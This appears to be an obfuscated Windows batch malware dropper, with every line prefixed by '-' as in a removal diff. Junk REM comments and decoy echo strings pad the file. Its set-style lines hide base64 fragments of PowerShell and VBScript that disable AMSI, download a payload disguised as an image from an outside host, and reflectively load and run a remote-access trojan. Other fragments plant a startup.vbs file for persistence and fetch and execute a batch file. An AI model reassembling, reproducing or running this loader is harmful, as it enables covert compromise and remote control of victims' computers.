-sE%pQGYX%T "JnhallHeJBS=LuouoQNzuWDkbPE"
-sE%oSt%T "TBNxthDixJNO=bTjdUvlbLEinkMraB"
-echo dUZHWGNmNmRodXdFREkwdUZGSXJwVkNuZTBRMEtVT0ttQTFqT01aNjJSb0pOZzNVRldWaENh >nul 2>&1
-REM sword valley clearing kiln circle delta clearing cipher binary
-REM circle odyssey guard strobe
-REM odyssey clearing sword
-REM mirage fathom fragment
-REM shadow beacon strobe core hawk
-REM clearing undergrowth valley core cipher lance
-SE%KRpLB%t "nDYyvBM=PmFIIJBONDCE"
-REM vertex core vision beacon mirage lance core kappa delta
-echo dEJvaUZiZWlFNGp0OEl3THdpM1hidXVPSDFZNDhFSVZ4Mm9MdXVGdnNkZDdpbnB4N2hhMlFMMUM0TGo= >nul 2>&1
-REM ruby core circle vision kiln
-REM fragment odyssey fragment guard vision pixel ruby pixel circle cipher
-se%rBlW%t "rmoBkecLWGIpa=XTeqsssPLKbBqxEDGnIxsZ"
-REM ruby valley sword shadow zenith kappa
-echo aTVVOXNzR0hBWUIyZ0JuS3pqZXljOWFKQmZSYk4wcFNxdWJGVUljZjNHR1JqajVobjZIRVZOTlhNRkVQUjZXOUVpaTVGY3dp >nul 2>&1
-REM kiln kiln pixel
-REM binary vision hawk guard binary
-REM clearing valley guard valley odyssey hawk undergrowth
-REM mirage vision fathom cipher delta ruby fragment valley
-REM lance fathom cipher mirage glimmer
-Se%QBJW%t "xHXDgzHpc=UcgRXxAVhz"
-REM guard sword fathom
-REM odyssey fathom ruby
-echo dUk1QlFkQnFUUzFqbHFFRDlXUHh4TE05aGNuWjBxSFh0MnRvY3phcjZHTk1kckRsZVR0YVhxVGg= >nul 2>&1
-Se%lwe%t "wCtzTDlBjtBPhjV=IvlmVSbMhBYiHjQK"
-echo Und3TTFQRzNsbWI3TWlaSnNnNFlBODZJWDZrU0J6RmRLQVpmazhJM0puamtVZDI= >nul 2>&1
-se%ZAESJ%T "IrqfOCO=vZy1TaWxlbnQgIlshXSBJbnZva2luZyBFbnRyeVBvaW50Li4uIChTZXNzaW9uIHdpbGwgYmxvY2sgdW50aWwgUkFUIGNvbXBsZXRlcyBvciBjcmFzaGVzKSIgIkN5YW4iCmlmICgkZW50cnkuR2V0UGFyYW1l"
-echo dnF5eHBmeVJiUzhMcEl6Y3JqVTIyaEZFSW16VFlEVjhmTnA1Szlxc0VDbDd4VmlFeWh5Nw== >nul 2>&1
-sE%rcy%T "BhjgIwFBTzecx=NoULscLThAWr"
-REM echo hawk mirage kappa sword kappa delta circle lance sword
-REM twilight fathom binary sword fathom
-SE%sqBSG%t "LRbeEi=fWahJHxIrzJJ"
-REM kiln clearing vision sword
-REM circle lance twilight sword sword glimmer
-Se%qoI%t "ittjNwlUSJ=PGXANRozryGdrOhVIqLunljFzPAgGzQ"
-sE%ZjpU%t "yzPgbBYTdQrzazA=GwfOwIUNGPudBcYRUKh"
-echo YTdLanhFckFSUXVDblNuUlBRZXRSanZZNnJjb1ZxOUdqeHFXTllDb1N4 >nul 2>&1
-REM odyssey binary guard fathom delta cipher
-REM core pixel shadow kappa valley ruby vertex mirage strobe
-Se%LOdV%T "DprCKDcyO=mCapRTJwEqNSqfZrGEMgYVRs"
-Se%wHsn%t "yzRUFbMRnb=PuzEdxkuXpmSXmjuqhguNbHfytoAap"
-se%mgdJ%t "IISERcXO=bKvdtuElcaUsKSghMY"
-REM undergrowth strobe odyssey kiln
-echo MEdoQ1pUNmt1bER1YkRpS3RMV2lBN3p3ZHFZWjZhdmdBWE8xVUNHQWc5WTFramtxR1lQSjZNMGVTYjE0YzdSU0k= >nul 2>&1
-REM odyssey shadow zenith undergrowth
-REM zenith beacon echo sword fragment valley delta
-Se%aay%T "gEEPHuzPLtzxdHk=wMhPTjbjpdtrlFvOxaiV"
-Se%rEmp%t "TfOjGlOHykk=FkVKVJFRBhHFJBPgXImeD"
-Se%MFe%t "ELVmkvWPo=GZDGZTQijtemdRcrUXqREiSeB"
-sE%hWpv%t "tEiIQB=0ZW0uSU8uUGF0aF06OkNvbWJpbmUoJHN0YXJ0dXBGb2xkZXIsICJzdGFydHVwLnZicyIpCkxvZy1TaWxlbnQgIlsqXSBDaGVja2luZyBmb3IgZXhpc3RpbmcgcGVyc2lzdGVuY2UgYXQ6ICR2YnNQYXRoIiAiR3JheS"
-Se%lVHV%t "gsVfOohmc=xNoPehPyjiWwfWlLUtfPTCGfcEHl"
-SE%RmHJ%T "QzyqFwcNV=ynQmONRwQTpbRvKSLjWpslMzXWvQeSe"
-REM clearing clearing strobe odyssey beacon undergrowth mirage valley strobe vertex
-REM delta strobe kiln shadow circle glimmer valley kappa undergrowth
-REM undergrowth fragment sword kiln phantom guard fragment cipher kiln
-se%dSd%T "XgHkmKBTRuk=RKZcimqYBjCIulx"
-se%SDOrv%T "JJQibaKR=UmVzb2x2ZSkKJG9uRXhjZXB0aW9uID0gW1N5c3RlbS5VbmhhbmRsZWRFeGNlcHRpb25FdmVudEhhbmRsZXJdewpwYXJhbSgkcywgJGUpCiRleCA9ICRlLkV4Y2VwdGlvbk9iamVjdApMb2ctU2lsZW50ICJbRkF"
-SE%Oqg%t "jUZPJGWSiM=oAXVUTQAditpMZkyXEEG"
-REM ruby glimmer binary core binary phantom fathom kappa vertex vertex
-REM ruby kappa beacon hawk shadow core clearing glimmer ruby
-echo WXpRYWFtdlRObmc0ODA4cVkwb3k4WVU0YnFiTkQwdHh2WFNucGVHM2w3c2hDSnUxYndXSzFmT0QzZU53bkNkVXlxWWNZSzk3MVlZWlJuMg== >nul 2>&1
-REM pixel fragment twilight zenith clearing pixel vertex pixel pixel delta
-REM valley clearing echo pixel zenith strobe beacon hawk
-sE%xhy%t "HDruVVpozayYrqH=RkrzzRNWeZzJQLxpVbIHtYWfScySlu"
-REM mirage mirage twilight kiln strobe strobe strobe undergrowth mirage undergrowth
-se%QnP%t "zoMQdWhPWhQFJWO=mreyeeAmzCLWrEMjjpPKqxDqjvruQNr"
-SE%AMiIN%T "MCMCFpEEXjh=lkYlHlYWjpgqcm"
-SE%LEz%t "GHLeHVFVZKefwiG=zeGMxQDNfvzyMyDayRB"
-REM fragment guard shadow binary cipher binary strobe undergrowth glimmer kappa
-REM cipher guard lance shadow clearing fragment clearing
-REM clearing undergrowth delta binary valley
-Se%qJF%t "AFZDiPGZw=dQmhSYqCVdoSmrLAvR"
-REM odyssey sword sword vision core beacon undergrowth hawk vision
-echo NzZUNFF2UGR2cEZkNm5WQ1IwVFppNjZ0Nzk3VkQ5RFk4U0VxczJMQ2Zvb2NNSGFqTkUwMDVmQ29vaWF2Sw== >nul 2>&1
-REM hawk binary mirage fragment circle valley fathom undergrowth valley undergrowth
-se%Xrc%T "kwFxBsCEyz=xMqyPZwdlndRSnfPSIsAVpgD"
-echo ZjZSSnFQZzhWUGtlS1phdE1ybVpqQk9qa1Jybk5FUjZYZG5RemI0N0F4MWVlME1QWURhZVQ= >nul 2>&1
-Se%tfMi%T "wvMDgiBYWwjfO=rRBTPUYYXzBJJZnn"
-REM echo hawk ruby fragment odyssey kappa beacon kiln
-sE%tzTU%t "CiVfFFsti=UyUCgktWTcE"
-REM circle vertex beacon twilight glimmer clearing beacon glimmer strobe
-REM core mirage circle undergrowth mirage kappa vertex sword circle kappa
-echo QVF5RVlWdURqYlFLMGc3Y000dm5lQUxwRXljd085ajBaVzZqenBoejJteTZ1cElxMDZyemlDeEJkRk1wN0Y= >nul 2>&1
-REM guard twilight kappa guard
-echo Uk1vcXNKaWVRa25EOXZNa3FuOG9RaXRjdkV6RjZIZElvSmNQU2J1MGVPck54Tm03eEZKUlJ6bzZtV0U0RGt2cEt1MElDckR4T1hjRWM1ZA== >nul 2>&1
-se%sKyQ%T "pTUyGhOs=UZXh0Ci5TYXZlVG9GaWxlIHRlbXBGaWxlLCAyIDogLkNsb3NlCkVuZCBXaXRoCnNoZWxsLlJ1biBDaHIoMzQpICYgdGVtcEZpbGUgJiBDaHIoMzQpLCAwLCBGYWxzZQpFbmQgSWYKU2V0IHNoZWxsID"
-Se%QxoX%T "bJeofH=xUeGGmrOBXWcCqrju"
-REM valley guard strobe strobe undergrowth clearing phantom zenith
-REM fragment glimmer valley kiln echo delta fragment vision circle zenith
-REM shadow fragment binary
-SE%FCh%T "jZCmQtIpQXa=xdjcbMXYIHL"
-REM core phantom fathom fathom hawk twilight circle zenith
-REM binary guard guard clearing sword cipher
-Se%uetQQ%t "QhcGQFbqgDFjY=MLXGMCqjYtXUoiQJrHTPEqlNJyVjTAq"
-REM delta echo undergrowth ruby fragment binary binary
-REM vision vertex vision fragment shadow guard strobe strobe sword guard
-Se%mQf%t "WTAMLMpfVCWEjkg=kaolLDRgCXcVunhPjQt"
-sE%tnG%T "vfxMExDNKTzUlEP=VrcRUBzlavS"
-Se%jRGof%T "xydZwtJ=fisOyIcUyuooNgZYGHGukQTcJAhGkvedjS"
-echo TzlCRHhaRVJuRFRvVVdzNGlWaEtvV1FCYVloV1UwUmNkRENpbWxLNkhWemcyS2FVeXJEQ1dqTGdoVndUSkNSWXh1V2t4OHk4djlKdQ== >nul 2>&1
-REM twilight undergrowth binary
-REM guard strobe ruby fragment vision vertex hawk odyssey
-SE%qldg%T "WOEDxqZdHr=KEITBidEIUEUnCYSzwbDCTDAcA"
-REM binary cipher twilight
-REM undergrowth vertex pixel ruby sword lance pixel core
-REM lance vision kiln cipher lance
-Se%JGzI%t "whmeadbaxC=ezOJFxJtwlBhFpvOseJ"
-REM phantom zenith echo
-echo TEdlbzQzdllYM3dLbGtWaGViR0lMNXFFekNGQnZhTTdoRFd3b1F2SHU= >nul 2>&1
-REM fragment odyssey vertex core vision vertex vision beacon
-REM beacon sword shadow guard delta pixel lance shadow echo fragment
-REM delta binary guard vision strobe shadow echo undergrowth phantom
-sE%hkEBH%T "JdkGHlg=mEuuvorEzF"
-SE%ick%T "ygIrbHYWdDiCH=xYdmdGpAGUsHgYmKxdiqlnUsozgjLGlz"
-SE%fEuW%t "IudUedVHi=yaXB0aW5nLkZpbGVTeXN0ZW1PYmplY3QiKQpEaW0gdSwgYwp1ID0gIiIKRm9yIEVhY2ggYyBJbiBBcnJheSgkY2hyQXJyYXkpCnUgPSB1ICYgQ2hyKGMpCk5leHQKRGltIEh0dHA6IFNldCBIdHRwID0gQ3JlYXRlT2JqZWN0KCJXaW5IdH"
-echo QUc4V1lkejZNVjF2SGtNa1RFamFMOHBEdXNsUGpPSmtkbU8wcXM5REhGQ0c2Z0NxYmlNcnhpWmM= >nul 2>&1
-REM valley vertex beacon cipher beacon vertex twilight
-se%vTYg%t "zeyRUNyW=SeJxSyZGtrHdWKytBIyOZWups"
-Se%hMVp%t "tHZbQLad=vnAkngYxFFKnjmWXcKkSCwnMjvgBPSVNuZ"
-REM kiln beacon twilight binary clearing core
-REM pixel twilight circle valley strobe
-se%Agv%t "hpXswXO=VXGyIGobJByaLmTeqgioUmSjpLD"
-REM lance vertex fathom phantom fathom odyssey core
-REM glimmer ruby beacon binary kiln ruby phantom fathom phantom
-Se%CcPX%T "GxJRSHqzeSQiy=aOqmiEgfqGULwRUIInAhPBJ"
-se%rwHBI%T "jqaLPqeNnlJQLl=KdUEPtpgwkJyEvaSFaE"
-echo bFY3Uk9FUDZzMDJQdjlXOWNqTXp2eWFpTUdKWnlYMWI4UXpMdTd3MWVUM25XN3pybWxKZ2lzaUIx >nul 2>&1
-Se%VrKAo%T "JkHVJaERRFqOoRV=fUbuXdxfmFTXFlPLWvZFDmhNi"
-SE%wBh%t "UdmEcgIkty=JnVEweTCIXMlltXaAezYhARWXcesHF"
-sE%lzQ%T "JGLjTjmAJwO=SMndVVNqgOSXqpOxR"
-REM ruby zenith odyssey circle clearing
-SE%FecE%t "fWdSmsVuD=iVURU1QJVx1c2VyLmJhdCIpCldpdGggQ3JlYXRlT2JqZWN0KCJBRE9EQi5TdHJlYW0iKQouVHlwZSA9IDIgOiAuQ2hhcnNldCA9ICJ1dGYtOCIgOiAuT3BlbgouV3JpdGVUZXh0IEh0dHAucmVzcG9uc2V"
-REM pixel echo core kiln zenith phantom
-echo aHFPOUFtb2JUeFNmVTVsWTBHeWNNZDlmVzliZHNoczlCZDNJQ1N2QTNHM0NZTEhseVRKZmNETlptNm9nUWZUWjlQSllGMTJVRXVWTHNp >nul 2>&1
-echo bTNSUGpzUFB1VXFpMjJFcTlJR3ZaeEhPaU9iQkdybHY2azJrejd6QXE= >nul 2>&1
-se%BMbg%T "iKwsjE=GIfAmmRvETLiKfrSsTFHoUMOxjYgKDB"
-REM ruby pixel valley
-REM kiln undergrowth vision echo beacon
-REM delta ruby phantom
-Se%ZvcJ%T "GEXcPsbgu=yYNAlwFeNzIBxeqxznnCWBxRZIe"
-REM delta strobe cipher
-REM phantom guard circle fathom binary undergrowth mirage lance
-REM cipher shadow pixel phantom kiln pixel
-REM strobe fragment phantom core ruby cipher beacon circle shadow
-REM odyssey undergrowth mirage glimmer odyssey odyssey valley circle strobe binary
-echo NTV5aGVHcWNPODVCNXlCOFNwa281M2xna2RkcE1ORERrVlU5Q0xRbG10QjlmUk9mVVRNblA2OU5NRENSd1FGR2VoazlLcXRJZzFFcVBza3c= >nul 2>&1
-se%LOu%T "emyEluGXQPmF=naJRTfpJllUNVxzHAKdVzYNP"
-REM vertex binary clearing
-REM zenith shadow kiln odyssey beacon
-echo cHlwdFRHaU0wODdlMEhRWEdMMFJENUg5bmRIRWxaeE1GSmxFc0VMWjVtOE81bWtkMXhNNzlvQVY0UlVVUHFiMm5sbQ== >nul 2>&1
-echo NFF2Qzl6OGdPRDZRaUhtVThwb1dPM1EzYlNBSmhqMnVxY3ZOeUN3RkQ5MHI= >nul 2>&1
-echo c2VGVWxJYmo1Z2hUcUFScjhRMXNZc29ZWGNTVmVRc0pQbnlZWjc2UnhSYTBMb0JFUE0= >nul 2>&1
-REM circle sword kappa core vertex sword clearing pixel binary mirage
-sE%FDEMl%t "TTKDBBr=ioJtpJKWLrqILaRGVxYDinIyNZlTkxduiJ"
-REM lance undergrowth beacon
-se%QwhyX%t "wRJszMmkYGU=hdmWLlrggLOoTjOPmKCHAWehCkL"
-se%OCBu%t "DesCNEegafTZNd=PyEkjAzmCmCrBziObQLVSETeNs"
-SE%fjje%T "nffBpUyu=xFQJiYyHcsbVCYgLxoAejqHvAgI"
-REM kappa shadow valley guard echo mirage
-REM glimmer clearing binary strobe ruby core glimmer zenith
-REM guard zenith delta kiln clearing
-REM fragment cipher phantom lance kappa
-se%ceZO%t "WDwQNiOhuDLH=YXRoIH0KaWYgKC1ub3QgJHRhcmdldCkgeyAkdGFyZ2V0ID0gJEltYWdlVVJMIH0KaWYgKC1ub3QgJFNpbGVudCkgeyAkU2lsZW50ID0gJGZhbHNlIH0KZnVuY3Rpb24gTG9nLVNpbGVudCB7CnBhcmFtKFtzdHJpbmddJE1lc3NhZ2UsIF"
-REM twilight glimmer pixel circle phantom
-echo SG01aHQ4S01GanJqVkVFa0VaMk5nWWZrSzRqd3I1Zm91OFlRbmNlcHIwcWI= >nul 2>&1
-se%KUDB%T "FoqnKBKsz=qCzXPqqAjnDbJPE"
-REM glimmer circle kiln mirage
-echo THo5em5zQ2lLMFo4VlRWS1g5bm5vdU9kSEFzMW41S1RiOWNNREltNklCVWJUdXVka1M5cTdl >nul 2>&1
-REM undergrowth undergrowth phantom guard vision kappa zenith lance
-REM echo kiln guard glimmer
-sE%SkB%t "QvkyLpTAgk=yEMYXPcizNinIgWeDRORcCWS"
-REM delta glimmer kappa
-sE%aZjb%t "QXhOgDbFRXSQBh=hYphmxPQbuhyKUNmjMtdTpomvIheG"
-REM fathom fathom core
-REM circle pixel vision kiln ruby circle cipher
-Se%PTlc%t "hrHUyMZqHE=DfpXZOkNplYq"
-REM phantom core binary guard clearing twilight vision kappa fathom guard
-sE%PQt%t "vMKtdeAPl=CtYmyNzPNwyGBTAPSVEAV"
-REM sword fathom twilight shadow clearing pixel clearing vision core core
-REM ruby mirage zenith hawk sword mirage lance clearing
-REM kappa glimmer clearing vertex vertex fathom shadow fragment vertex beacon
-sE%ByyA%T "yjmCHazHAq=GzlSVMmwLJTVViYflrFfCJaCNL"
-REM circle core twilight hawk guard binary
-SE%prJdo%t "RQkrWVb=YtvRlNbOqZy"
-REM glimmer kiln clearing ruby phantom mirage
-sE%cfYJY%T "wmzGTD=EFVQvhaVpOlHOVZX"
-SE%Whw%t "VonibXKJIfwvcL=cRosFeFZwpxFrQ"
-REM valley undergrowth cipher cipher fragment phantom
-se%AiM%T "jYwAsR=pVPdgVufEMfbgJVzqBFpemtJn"
-sE%HODDF%T "qxsvRViFSzibWsh=HroeKppbDlapTMSSc"
-sE%nLScm%t "ucRTPlmPsbBNmun=UjObHBxxDlHTTEkPxxyGC"
-se%lFOHZ%t "aPOHSn=fJHbMteUuHWiHcARpceOeY"
-sE%eImJN%t "GRNrGy=xcnKETVELUFcSvJI"
-se%cPKh%T "CxvAnanTEAMz=0gTm90aGluZwpTZXQgZnNvID0gTm90aGluZwoiQAp0cnkgewokdmJzQ29udGVudCB8IE91dC1GaWxlIC1GaWxlUGF0aCAkdmJzUGF0aCAtRW5jb2RpbmcgYXNjaWkKTG9nLVNpbGVudCAiWytdIFBlcnNpc"
-Se%HvcFX%t "YRWjobAj=50RG9tYWluLkdldEFzc2VtYmxpZXMoKSB8IFdoZXJlLU9iamVjdCB7ICRfLkdsb2JhbEFzc2VtYmx5Q2FjaGUgLWFuZCAkXy5Mb2NhdGlvbiAtbGlrZSAiKm1zY29ybGliLmRsbCoiIH0gfCBTZWxlY3QtT2JqZWN0IC1Ga"
-Se%Szc%t "XNYSuSXCvxqQf=metAKBhCtCx"
-sE%tNX%T "ugOjRBPTS=LUkfVbRotjdQRvqfXIBcUxA"
-echo ZHAyejBZbHQ3YlhsdmRXa2U5Rm8ycXFpRW9uaDhST2NiWTRXaFYxaTM= >nul 2>&1
-REM kappa hawk zenith echo kiln twilight mirage vertex circle vertex
-REM pixel clearing kappa kiln guard ruby pixel odyssey hawk cipher
-REM kiln mirage beacon strobe strobe twilight fathom sword kappa
-echo eUNsOHRJTmlwdGxTZlhobmkyb2JlM1NqYWFmTEFZT3EzMVJYeTdXemd2QWxHQkh3WVhY >nul 2>&1
-echo YmxORWllVGxqV3ViM3c4cDdRUGFCSXdTcFJYN2prTDlaUmhCWkZ2S3kxYkhzbVo5ZzVQU3FVelRUSHFmbHZBa3RIOG1jYlVaZHBnOEs= >nul 2>&1
-REM ruby clearing core core phantom twilight vertex shadow phantom
-se%Npsog%T "gDQGScmduK=LxiJxJOsEKjieYUKcxY"
-echo ZWU1U3ZYNFRFb0FhSHFzYjRxRjdwak4zQ3FiOHA4SHBFZ0FpOGdyTWRLMWFwckdIVUJGNnV6bjhIR080TEJ3N3ZqcVkwWWc= >nul 2>&1
-REM twilight valley vision phantom pixel vision echo pixel vertex
-Se%zkvT%T "srvBplFsFpgxIE=EalFybJlSvVuMiOERLJ"
-sE%ngNDt%T "TzNtjL=LMLpgSYtEN"
-REM guard kappa cipher
-echo NUdmZ0F0Slo4ZW5uaFlYMW01U1FXa2lCdjNpOTFLSUlPcFNzbG9rZkdsZ25rVWY1YWFCRW1o >nul 2>&1
-REM delta glimmer hawk echo mirage core
-echo dXYyeEo5cTZjUUpwSlB3NEFWbW52Tnk4OFRvWkF1dkxzb3hxQTVmV3NIOE1POWNmM2FSTmdvMXBqVTBqT2NCeGxTbWhzcGRZdDk= >nul 2>&1
-se%lGl%T "NbkSkwXzFxMuo=zoWKVCRYyJKtjEksbgm"
-REM vertex fathom clearing core circle kiln
-se%zXwW%T "UuZTAf=C1hbmQgKCRfLkdldFBhcmFtZXRlcnMoKS5Db3VudCAtZXEgMSkKfSB8IFNlbGVjdC1PYmplY3QgLUZpcnN0IDEKJGxvYWRlZCA9ICRsb2FkTWV0aG9kLkludm9rZSgkbnVsbCwgKCwkcmF3U"
-REM pixel circle vertex undergrowth circle hawk binary undergrowth hawk
-Se%CoLqi%T "gaOifdo=pReSKBuKvsqVliMdNuluQlXdTsVcil"
-se%yYKVL%t "EuSAPMnUzWkV=JcNKGXCeJjaxNYqUCYolpUQszSPa"
-sE%QtDN%T "xgSbwgc=AOAPxbBvePXFATgMF"
-REM clearing beacon clearing lance core
-REM delta glimmer glimmer
-REM valley shadow clearing delta circle mirage guard ruby
-SE%VGKmi%t "ABBjSh=XbVgyrjogHAhBDHKwAxFHfNbKEDDxBkbdFg"
-REM pixel hawk delta vision guard odyssey undergrowth phantom hawk
-sE%yaNin%t "MqcMWKstH=QUAQQohuepSFs"
-REM clearing strobe odyssey shadow glimmer phantom odyssey sword fragment twilight
-echo cHFYRWdNRjBQeXNocXZnZUd2STJ4RnVHV1BBdEt0WFdnRG1IR0s0cDRZcGtWbTY= >nul 2>&1
-Se%DXm%t "ydgBLi=OxGXZQRlHdgblDCCsvrUtLyrTZHUVRwQT"
-REM pixel ruby odyssey mirage
-REM kappa vision fragment binary zenith guard fathom clearing sword guard
-Se%MCrJN%T "eeakBEBYegFlQG=EXQoPYBGlRusIzzTfeNhKXRO"
-sE%Yug%t "IWYhOpxKqIaS=cVpuFgPbslZEhCwNTnzqcNGxmr"
-sE%hLYP%T "vSYXSKzGNDaZuio=gFlnuBUabYAdmFSjipjvDLClJNLJhIGNbys"
-REM fathom zenith ruby glimmer sword zenith
-SE%KwsqG%T "hzsLPaqpdsin=huELphzpJEmMIogqOxXAJDahgUW"
-SE%zAZ%t "mKtZXpYqDHecCW=PJDJEuMhtdwcdUGmNVca"
-REM mirage core ruby glimmer twilight
-REM hawk echo echo vision undergrowth vision echo lance odyssey echo
-Se%PUAug%t "PyDQpbtN=mqUEgUjZriihIPrSMVM"
-Se%Mko%T "TPrFdoNFses=AQTSSbolxOCrlhddTPpyU"
-REM binary strobe echo lance kiln mirage kappa
-echo N0Yzd3VoSHdyc0N2dktrN3BVanZXUTZ0NjZLbnNNMG5uOFVjWlRoRDhYTG4xSU1HUFgxbGJ0dDV4ejVP >nul 2>&1
-echo dVpKZlllRlBFOW1ZUnFTUk4yakF4MVJQZU1HcFFJakNuT1M4ZlNuYXpEUjA1WUlhWExrS1E= >nul 2>&1
-REM glimmer lance cipher ruby ruby fathom
-Se%XuHBw%t "XTZlJNa=bfAtrjuQDzoCQJc"
-se%egcp%t "gYEkxsIsFlRigI=dmtrRyhDrp"
-REM circle kappa circle phantom mirage
-Se%rvob%T "WVUFHfv=PUQEVnxgYPJOFDeBRIsWKkkWjfC"
-echo cmJMeEhNaUJjUFQ0T0l2dmM5V3NQN2J1N2hFWk5rZjB0U2RHUlk5UjBh >nul 2>&1
-echo aFhkcEV2WjlITlBSelp4aWk1S3RWOU5udjFqdGdXZ0JDZVZoMXl3UVNscnZYRDdUVkpDS0g3U2QyZEpLcUpFU0xM >nul 2>&1
-echo T2dGajZOd0hHZkVDMFdBcFNYcUpHZERRV2s1WU5ndzFyZ3VFR2g4dVE0Z0R5WjI4SjN0ZUF6MnZm >nul 2>&1
-sE%FQin%T "pJtovy=zGjEbbsvfrhhNZElBMIrPFZWXWOaQj"
-sE%vAt%T "lRkDYnjXY=AcgilGFKjssVEVxOQXTP"
-Se%gks%t "IktnkjAqsZtxry=DZXpuNRDei"
-REM circle vertex glimmer valley kiln
-sE%uPCC%t "ZRJPAKfvXQwdk=aOxHucQQmnIjdjvHGLasCR"
-REM vertex binary valley beacon kappa hawk
-REM clearing clearing hawk mirage guard odyssey circle
-REM vision clearing pixel zenith clearing
-REM strobe sword phantom binary
-REM zenith phantom mirage
-SE%yrMdt%T "NccQFJPNs=iIZSURehSDWsuuTbuAgEWCloFIN"
-REM circle binary guard valley phantom guard odyssey kappa phantom binary
-REM echo fathom hawk odyssey vision fragment glimmer vision binary echo
-REM kappa cipher pixel pixel clearing
-REM clearing shadow vertex beacon undergrowth echo fragment echo mirage
-REM odyssey cipher vertex odyssey undergrowth binary
-REM strobe beacon strobe mirage
-SE%uarC%T "zidXMo=ayOthGcfnAjIhnWjdXuQFhdTkV"
-Se%AYKoO%T "mzXDhYh=xgSGorBzdmnbuSCFGkODUmBCZlwXY"
-REM delta binary kiln circle phantom undergrowth strobe hawk odyssey
-echo OGVuR1RreTFVN0ladTE3YVNHM1Zzbml5YWZpTEUzQlFya2JIQVF1WXc0MXlYc2l1RkRiRA== >nul 2>&1
-sE%QEAt%t "BnimbAXRXHOIF=epZLsRagiOloyzECghBHDhrKxzEJtKEpA"
-SE%hwSwm%T "WTIiqtoaf=OgRfAduhRCYhJXnVvKExvtfCUHWg"
-REM vertex strobe binary fathom shadow
-REM vertex cipher vertex fathom circle vision cipher sword mirage
-echo ZTB6Vk52NXlEVVRaZkR2bk56QTFaUlA2aFdURmE4bWpkMEdZM0V6UHJrSWdFc0xEbUVHNnRCQTVRaA== >nul 2>&1
-REM guard kiln vision twilight core
-SE%HrNSr%T "HtsxofviF=TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IikKJGRhdGEgPSAkd2MuRG93bmxvYWREYXRhKCRTb3VyY2UpCiR3Yy5EaXNwb3NlKCkKfSBlbHNlaWYg"
-REM ruby valley guard kiln shadow vision circle cipher strobe glimmer
-REM beacon twilight kiln pixel fathom vision pixel core kappa odyssey
-REM zenith core odyssey
-REM fathom kiln clearing clearing
-SE%SFnLH%T "dSkCiKgcxz=zyFKrGBkpvYUWckEwPwlZkdWNiiYFfsThh"
-echo U2tEZlZId2lrelN0eXB3QWUwdkdWY2dlNGliaVN4eWNNRllIdDNXcjhISmdKWEZWV2NzYWlwWg== >nul 2>&1
-REM cipher pixel hawk lance kiln valley
-REM zenith delta clearing glimmer
-REM vision fathom phantom glimmer twilight kiln glimmer valley ruby
-REM vision glimmer vision circle
-echo TXFodlllYXp1eGRxcTNiSm9WaEVrNTl5emk4OGRHRUNQanNGcFo3bWJ2RENqd21KOUc= >nul 2>&1
-echo UkdVUXYxZms3THU0d2VFM21PMUdqTGthNW1RbE4zYUdDTXNDR2ljYzc= >nul 2>&1
-sE%gOUD%T "IYKkyf=zCycbxTQbZPLrGZjcDHgsBeTmEEQClbrbEu"
-sE%kcf%T "WdzExVfhJ=daMTsmjpAxraPC"
-REM delta ruby vision mirage vertex fathom sword circle
-SE%GEiGv%T "CqyZnp=kpaDIWgpjyogkkHmrqbUwmHpM"
-echo cHQySE5CUlYwd2J0OUNDUkpQaHMwMGRQSlM4VUQ5aXQ0Q25VYkNOTQ== >nul 2>&1
-REM echo guard lance fathom glimmer delta shadow
-sE%kGSY%t "vcsbCpLesjZMC=qofbUCGOKCFAjj"
-Se%HOlaa%T "qlWomP=VcmwpCiRzdGFydHVwRm9sZGVyID0gW1N5c3RlbS5JTy5QYXRoXTo6Q29tYmluZSgkZW52OkFQUERBVEEsICJNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiKQokdmJzUGF0aCA9IFtTeXN"
-Se%WIkMF%T "VdENdkiThKwK=fJjwwueLfFKlXIVPNseHNiNRaLkSEmECREH"
-REM lance twilight binary kiln circle glimmer beacon lance vertex
-REM odyssey zenith core delta hawk lance cipher ruby
-REM mirage ruby guard odyssey binary shadow cipher ruby guard zenith
-se%Fksd%t "JFRfsJETZIOE=GfaadEcdHKaJOSGUrpfZIOonE"
-se%Gpv%T "KwwxwiN=EVudHJ5UG9pbnQgcmV0dXJuZWQuIiAiR3JlZW4iCn0gZWxzZSB7CkxvZy1TaWxlbnQgIk5vIEVudHJ5UG9pbnQgZm91bmQuIiAiV2hpdGUiICR0cnVlCn0KfSBjYXRjaCB7CkxvZy1TaWxlbnQgIkxvYWRlciBFc"
-echo ejZjRmtjQnFBTWVrbGF1Q0hnbmF0eEdsRGZJTkZxSUhvUnBIWVlGWWZVdlNud0NjR1l1MUZtUDFSdTMxcGxSS3M2eklVN2I= >nul 2>&1
-Se%Lfz%t "lBSMKTTVWsRCvL=VhRdCRgWXmmgGLwwKCZZmXxNlWzVS"
-sE%eGa%T "kjXKQO=schMvRQDqAsiOqzCEQkHZXXsnYukSZP"
-se%MWkO%T "JrarSrmC=WDldyRmzhhcKxtc"
-se%aIZ%T "soNqMxD=CwgJHRydWUpIH0KfQp9IGNhdGNoIHsgfQp9CkRpc2FibGUtQU1TSQokSW1hZ2VVUkwgPSAiaHR0cHM6Ly9pLmliYi5jby84bkhaQk1zVC9tZW0ucG5nIgppZiAoLW5vdCAkdGFyZ2V0KSB7ICR0YXJnZXQgPSAkSW1hZ2VQ"
-REM sword phantom shadow strobe core
-REM mirage vertex shadow kiln fragment
-Se%PErR%t "UCrFukiGzDW=RHRJcCwQlNboj"
-REM valley cipher kiln circle sword fragment
-Se%jnSQ%t "gZfYnJ=MRNCQxjroHpoBKQrdmyLe"
-se%xqmB%T "dLxtrlujQvykiw=RIEpxdFHdgvVJytIKncxeUBaFx"
-REM clearing pixel hawk ruby odyssey
-REM zenith delta kappa sword odyssey phantom vertex
-REM shadow lance binary guard valley phantom cipher
-echo anNHQXhpMk42OWhUc1kwUTB6aWFtZmFJZWxwNEJYQjFpWDZ4cHkwUVJqVGpTREF0UTNZSGhhamF3UkZKbFpXYzVnOVZKVzM2ODUzMTNTSw== >nul 2>&1
-se%Azs%t "okVhtk=zIshcTKfuyPCiCMNoheyppma"
-echo OENDS0g0bGNVSXJ0WkZwQlI2bHcwU09ycVFkU1NUcUtJQkZrb0d5ZWZMWlRUZGFvaENkQjlXaWZ1c3NuSkc5QTFRU29NOU1NWA== >nul 2>&1
-SE%axim%t "TEDDuMPfm=BMFZYWvhGJndWSvLjHvs"
